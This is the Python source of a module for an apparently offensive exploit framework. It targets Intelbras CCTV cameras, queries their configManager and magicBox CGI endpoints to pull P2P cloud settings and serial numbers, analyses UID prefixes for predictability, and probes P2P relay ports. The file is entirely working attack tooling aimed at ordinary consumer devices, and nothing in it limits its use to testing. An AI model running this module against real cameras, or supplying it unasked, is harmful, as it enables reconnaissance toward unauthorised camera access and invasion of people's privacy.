# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Intelbras CCTV — P2P/Cloud UID Predictability Scanner.

Probes Intelbras devices for P2P cloud connectivity indicators and
checks UID generation patterns for predictability.

Version: 1.0.0
"""

import socket

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Intelbras P2P Cloud UID Predictability Scanner.

    Probes Intelbras CCTV devices for P2P/iSIC cloud module indicators
    and attempts to extract the device serial/UID for pattern analysis.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intelbras P2P/Cloud UID Scanner",
        "description": (
            "Scans Intelbras CCTV devices for P2P cloud connectivity (iSIC / DMSS) "
            "and attempts to extract device serial number and UID for predictability "
            "analysis. Ref: INTELBRAS-2026-006."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": (
            "https://www.intelbras.com/",
        ),
        "devices": (
            "Intelbras VIP series",
            "Intelbras MHDX series",
            "Intelbras NVD series",
        ),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(80, "HTTP port")

    _P2P_ENDPOINTS = [
        "/cgi-bin/configManager.cgi?action=getConfig&name=T2UServer",
        "/cgi-bin/configManager.cgi?action=getConfig&name=General",
        "/cgi-bin/magicBox.cgi?action=getSerialNo",
        "/cgi-bin/magicBox.cgi?action=getDeviceType",
        "/cgi-bin/magicBox.cgi?action=getSoftwareVersion",
        "/cgi-bin/magicBox.cgi?action=getMachineName",
    ]

    def run(self) -> None:
        print_status(
            "Probing P2P/cloud configuration on {}:{}...".format(
                self.target, self.port
            )
        )

        serial = None
        device_type = None

        for path in self._P2P_ENDPOINTS:
            resp = self.http_request(method="GET", path=path)
            if resp and resp.status_code == 200 and resp.text:
                text = resp.text.strip()
                if len(text) > 5:
                    print_success("Endpoint accessible: {}".format(path))
                    print_status("  Response: {}".format(text[:200]))

                    if "SerialNo" in path and "=" in text:
                        serial = text.split("=")[-1].strip()
                    elif "DeviceType" in path and "=" in text:
                        device_type = text.split("=")[-1].strip()

        if serial:
            print_success("Device Serial: {}".format(serial))
            if len(serial) > 6:
                prefix = serial[:6]
                print_status(
                    "UID prefix pattern: {} — check for sequential/MAC-based generation"
                    .format(prefix)
                )

        if device_type:
            print_success("Device Type: {}".format(device_type))

        try:
            for p2p_port in (8800, 8900, 9000):
                sock = socket.create_connection(
                    (self.target, p2p_port), timeout=3
                )
                print_success("P2P relay port {} is open".format(p2p_port))
                sock.close()
        except Exception:
            pass

    @mute
    def check(self) -> bool:
        resp = self.http_request(method="GET", path="/")
        return resp is not None and resp.status_code in (200, 302, 401)
